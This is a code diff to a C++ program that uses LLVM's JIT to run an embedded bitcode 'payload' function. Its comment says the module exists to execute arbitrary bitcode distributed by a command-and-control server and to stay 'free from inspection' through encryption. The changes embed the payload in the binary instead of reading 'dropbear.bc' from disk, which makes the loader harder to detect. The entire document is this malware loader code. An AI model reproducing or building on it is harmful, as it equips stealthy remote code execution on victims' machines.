@@ -5,6 +5,7 @@
 #include <llvm/IR/Module.h>
 #include <llvm/IRReader/IRReader.h>
 #include <llvm/IR/LLVMContext.h>
+#include <llvm/Support/MemoryBuffer.h>
 #include <llvm/Support/SourceMgr.h>
 
 using namespace llvm;
@@ -13,23 +14,33 @@ using namespace std;
 /**
    This is mainly a copy of vm.cpp, so why do we want to
    run the JIT within itself so to speak? The reason is because
-   we want this module to serve as machinery that creates
-   a daemon and facilitates the arbitrary execution of bitcode
-   distributed by a C&C.
+   we may want this module to serve as machinery that facilitates 
+   the arbitrary execution of bitcode distributed by a C&C.
 
    We would like this code to remain free from inspection, so since
    we compile it to bitcode, we can encrypt it and distribute it
    with vm.cpp, which will simply decrypt it and pass it to the
    JIT.
 */
+
+extern char _binary_payload_bc_start;
+extern char _binary_payload_bc_end;
+extern char _binary_payload_bc_size;
+
 int main (int argc, const char *argv[]) {
   LLVMContext context;
-  
+ 
   SMDiagnostic error;
-  Module *m = ParseIRFile("dropbear.bc", error, context);
+
+  StringRef runtime_data(&_binary_payload_bc_start,
+                         (size_t)&_binary_payload_bc_size);
+  auto runtime =
+        MemoryBuffer::getMemBuffer(runtime_data, "", false);
+
+  Module *m = ParseIR(runtime, error, context);
 
   ExecutionEngine *TheExecutionEngine;
-  
+
   // Create the JIT.  This takes ownership of the module.
   TheExecutionEngine = EngineBuilder(m).setUseMCJIT(true).create();
   
@@ -39,7 +50,7 @@ int main (int argc, const char *argv[]) {
     cerr << "Function payload not defined!" << endl;
     exit(1);
   }
-  
+ 
   TheExecutionEngine->finalizeObject();
   
   // JIT the function, returning a function pointer.
@@ -48,6 +59,6 @@ int main (int argc, const char *argv[]) {
   int (*FP)(int argc, const char*[]) = (int (*)(int argc, const char*[]))FPtr;
   
   FP(argc, argv);
-  
+
   return 0;
 }
